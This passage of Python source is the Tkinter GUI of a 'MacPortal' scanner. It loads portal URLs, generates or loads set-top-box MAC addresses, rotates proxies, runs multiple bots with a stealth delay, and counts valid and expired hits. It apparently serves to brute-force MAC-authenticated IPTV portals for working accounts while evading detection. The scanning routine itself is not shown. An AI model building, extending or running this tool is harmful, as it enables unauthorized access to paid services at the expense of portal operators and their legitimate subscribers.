        if hasattr(self, '_editing_portal_idx') and self._editing_portal_idx is not None:
            idx = self._editing_portal_idx
            self.portals[idx] = portal
            self.portal_listbox.delete(idx)
            self.portal_listbox.insert(idx, f"{url} [{ptype}]")
            self.portal_listbox.selection_set(idx)
            self._editing_portal_idx = None
            self._log(self.T("info_portal_updated", url=url, ptype=ptype), "success")
        else:
            self.portals.append(portal)
            self.portal_listbox.insert(tk.END, f"{url} [{ptype}]")
            self._log(self.T("info_portal_added", url=url, ptype=ptype), "info")

        self.portal_url_var.set("")

    def _edit_portal(self):
        sel = self.portal_listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        portal = self.portals[idx]

        self.portal_url_var.set(portal['url'])
        self.portal_type_var.set(portal['type'])
        self._editing_portal_idx = idx
        self._log(self.T("info_editing_portal", url=portal['url']), "info")

    def _remove_portal(self):
        sel = self.portal_listbox.curselection()
        if sel:
            idx = sel[0]
            self.portal_listbox.delete(idx)
            self.portals.pop(idx)
            self._editing_portal_idx = None
            self._log(self.T("info_portal_removed"), "info")

    def _clear_portals(self):
        self.portals.clear()
        self.portal_listbox.delete(0, tk.END)
        self._editing_portal_idx = None
        self._log(self.T("info_portals_cleared"), "info")

    def _load_portals_json(self):
        filepath = filedialog.askopenfilename(
            initialdir=BASE_DIR,
            filetypes=[("JSON", "*.json")],
            title=self.T("btn_load_list")
        )
        if not filepath:
            return

        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)

            count = 0
            for p in data:
                url = p.get('url', '').strip()
                ptype = p.get('type', 'Auto-detect')
                if not url:
                    continue

                if ptype == 'Auto-detect' or ptype not in PORTAL_TYPE_OPTIONS:
                    detected = auto_detect_portal(url)
                    ptype = detected if detected else 'c/portal.php'

                portal = {"url": url, "type": ptype}
                self.portals.append(portal)
                self.portal_listbox.insert(tk.END, f"{url} [{ptype}]")
                count += 1

            self._log(self.T("info_portals_loaded", count=count, filename=os.path.basename(filepath)), "success")
        except Exception as e:
            self._log(self.T("error_load_portals", error=e), "error")
            messagebox.showerror("Error", self.T("error_load_portals", error=e))

    def _save_portals_json(self):
        if not self.portals:
            messagebox.showwarning(self.T("section_portals"), self.T("info_portals_cleared"))
            return

        filepath = filedialog.asksaveasfilename(
            initialdir=BASE_DIR,
            defaultextension=".json",
            filetypes=[("JSON", "*.json")],
            title=self.T("btn_save_list"),
            initialfile="portals.json"
        )
        if not filepath:
            return

        try:
            data = [{"url": p['url'], "type": p['type']} for p in self.portals]
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            self._log(self.T("info_portals_saved", count=len(self.portals), filename=os.path.basename(filepath)), "success")
        except Exception as e:
            self._log(self.T("error_save_portals", error=e), "error")
            messagebox.showerror("Error", self.T("error_save_portals", error=e))

    # ── Config Persistence ────────────────────────────────
    def _load_config(self):
        if not os.path.exists(CONFIG_FILE):
            return
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                cfg = json.load(f)

            self.nick_var.set(cfg.get('nick', ''))
            self.mac_source_var.set(cfg.get('mac_source', 'random'))
            self.mac_prefix_var.set(cfg.get('mac_prefix', '00:1A:79:'))
            self.mac_combo_var.set(cfg.get('mac_combo', 'random'))
            sp = cfg.get('serial_prefix', '')
            sp_clean = sp.replace(":", "").upper()
            sp_clean = "".join(c for c in sp_clean if c in "0123456789ABCDEF")
            self.nibble1_var.set(sp_clean[0:1] if len(sp_clean) >= 1 else "")
            self.nibble2_var.set(sp_clean[1:2] if len(sp_clean) >= 2 else "")
            self.mac_count_var.set(str(cfg.get('mac_count', 1000)))
            self.use_proxy_var.set(cfg.get('use_proxy', False))
            self.proxy_type_var.set(cfg.get('proxy_type', 'Socks5'))
            self.bots_var.set(cfg.get('bots', 1))
            self.timeout_var.set(cfg.get('timeout', 10))
            self.stealth_var.set(cfg.get('stealth_delay', 0))

            self._on_mac_source_change(self.mac_source_var.get())
            self._on_proxy_toggle()

            for p in cfg.get('portals', []):
                self.portals.append(p)
                self.portal_listbox.insert(tk.END, f"{p['url']} [{p['type']}]")

            if cfg.get('proxy_file'):
                self.proxy_file_var.set(cfg['proxy_file'])
            if cfg.get('mac_file'):
                self.mac_file_var.set(cfg['mac_file'])
            if cfg.get('single_mac'):
                self.single_mac_var.set(cfg['single_mac'])

            geom = cfg.get('window_geometry', '')
            if geom:
                try:
                    self.geometry(geom)
                except Exception:
                    pass

            self._refresh_file_lists()

        except Exception:
            pass

    def _save_config(self):
        cfg = {
            'window_geometry': self.geometry(),
            'nick': self.nick_var.get(),
            'mac_source': self.mac_source_var.get(),
            'mac_prefix': self.mac_prefix_var.get(),
            'mac_combo': self.mac_combo_var.get(),
            'serial_prefix': self._get_serial_prefix(),
            'mac_count': self.mac_count_var.get(),
            'use_proxy': self.use_proxy_var.get(),
            'proxy_type': self.proxy_type_var.get(),
            'bots': self.bots_var.get(),
            'timeout': self.timeout_var.get(),
            'stealth_delay': self.stealth_var.get(),
            'portals': self.portals,
        }

        if self.use_proxy_var.get():
            cfg['proxy_file'] = self.proxy_file_var.get()
        if self.mac_source_var.get() == 'file':
            cfg['mac_file'] = self.mac_file_var.get()
        if self.mac_source_var.get() in ('single', self.T('single')):
            cfg['single_mac'] = self.single_mac_var.get()

        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(cfg, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    # ── Window Close ──────────────────────────────────────
    def _on_close(self):
        self._save_config()
        state.running = False
        state.pause_event.set()
        self.destroy()

    def _get_serial_prefix(self):
        n1 = self.nibble1_var.get().upper()
        n2 = self.nibble2_var.get().upper()

        if n1 and n2:
            return n1 + n2
        return ""

    def _reset_nibbles(self):
        for var in self._nibble_vars:
            var.set("")

    # ── Scanner Control ───────────────────────────────────
    def _get_scan_config(self):
        prefix_display = self.mac_prefix_var.get()
        prefix = prefix_display
        for p in MAC_PREFIXES:
            if p in prefix_display:
                prefix = p
                break

        proxy_file = ""
        if self.use_proxy_var.get():
            pf = self.proxy_file_var.get()
            if pf and pf != self.T("no_files"):
                proxy_file = os.path.join(PROXY_DIR, pf)

        mac_source_val = self.mac_source_var.get()
        mac_source = 'random'
        mac_file = ""
        single_mac = ""

        if mac_source_val in ("single", self.T("single")):
            mac_source = 'single'
            single_mac = self.single_mac_var.get().strip()
        elif mac_source_val not in ("random", "Random", self.T("random")):
            mac_source = 'file'
            mf = self.mac_file_var.get()
            if mf and mf != self.T("no_files"):
                mac_file = os.path.join(COMBO_DIR, mf)

        return {
            'nick': self.nick_var.get() or 'Unknown',
            'portals': self.portals,
            'mac_source': mac_source,
            'mac_prefix': prefix,
            'mac_combo': self.mac_combo_var.get(),
            'serial_prefix': self._get_serial_prefix(),
            'mac_count': int(self.mac_count_var.get() or 1000),
            'mac_file': mac_file,
            'single_mac': single_mac,
            'randomize_order': self.mac_combo_var.get() == 'random',
            'use_proxy': self.use_proxy_var.get(),
            'proxy_file': proxy_file,
            'proxy_type': self.proxy_type_var.get(),
            'bots': max(1, int(self.bots_var.get() or 1)),
            'timeout': int(self.timeout_var.get() or 10),
            'stealth_delay': float(self.stealth_var.get() or 0),
        }

    def start_scanner(self):
        if not self.portals:
            messagebox.showerror(self.T("section_portals"), self.T("warn_missing_portal"))
            return

        mac_source = self.mac_source_var.get()
        if mac_source in ("single", self.T("single")):
            sm = self.single_mac_var.get().strip()
            if not sm:
                messagebox.showerror(self.T("section_mac"), self.T("warn_missing_mac"))
                return
            if not PATTERN.search(sm):
                messagebox.showerror(self.T("section_mac"), self.T("warn_invalid_mac"))
                return
        elif mac_source not in ("random", "Random", self.T("random")) and not self.mac_file_var.get():
            messagebox.showerror(self.T("section_mac"), self.T("warn_missing_mac_file"))
            return

        if self.use_proxy_var.get():
            self._refresh_file_lists()
            proxy_file = self.proxy_file_var.get()
            if not proxy_file or proxy_file == self.T("no_files"):
                if not messagebox.askyesno(
                    "Proxy File Missing",
                    "No proxies loaded. Do you want to proceed with no proxies?",
                    icon="warning"
                ):
                    return

        self._save_config()

        for item in self.tree.get_children():
            self.tree.delete(item)
        self.log_text.delete("0.0", "end")
        self.progress.set(0)
        self.summary_var.set(
            self.T("summary_format", valid=0, expired=0, errors=0, total=0))
        self._reset_counters()

        self.start_btn.configure(state="disabled")
        self.pause_btn.configure(state="normal")
        self.stop_btn.configure(state="normal")
        self.status_var.set(self.T("status_scanning"))

        config = self._get_scan_config()
        state.show_real_proxy_ip = self.show_real_proxy_ip_var.get()
        self.scanner_thread = threading.Thread(
            target=run_scanner,
            args=(config, self._log, self._on_progress, self._on_done),
            daemon=True,
        )
        self.scanner_thread.start()

    def toggle_pause(self):
        if state.paused:
            state.paused = False
            state.pause_event.set()
            self.pause_btn.configure(text=self.T("btn_pause"))
            self.status_var.set(self.T("status_scanning"))
            self._log(self.T("info_scan_resumed"), "info")
        else:
            state.paused = True
            state.pause_event.clear()
            self.pause_btn.configure(text=self.T("btn_resume"))
            self.status_var.set(self.T("status_paused"))
            self._log(self.T("info_scan_paused"), "warning")

    def stop_scanner(self):
        state.running = False
        state.pause_event.set()
        self.status_var.set(self.T("status_stopping"))
        self._log(self.T("info_stopping"), "warning")

    def _on_progress(self, done, total):
        def _update():
            if total > 0:
                self.progress.set(done / total)
            self.status_var.set(f"{self.T('status_scanning')} {done}/{total}")
        self.after(0, _update)

    def _on_done(self):
        def _update():
            self.start_btn.configure(state="normal")
            self.pause_btn.configure(state="disabled")
            self.stop_btn.configure(state="disabled")
            self.pause_btn.configure(text=self.T("btn_pause"))
            self.progress.set(1.0)
            self.status_var.set(self.T("status_done", found=state.found_count))

            found = state.found_count
            if len(self.portals) > 1:
                msg = self.T("scan_done_multi", found=found)
            else:
                msg = self.T("scan_done_msg", found=found)
            messagebox.showinfo(self.T("scan_done_title"), msg)
        self.after(0, _update)


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    app = MacPortal()
    state._gui = app
    app.mainloop()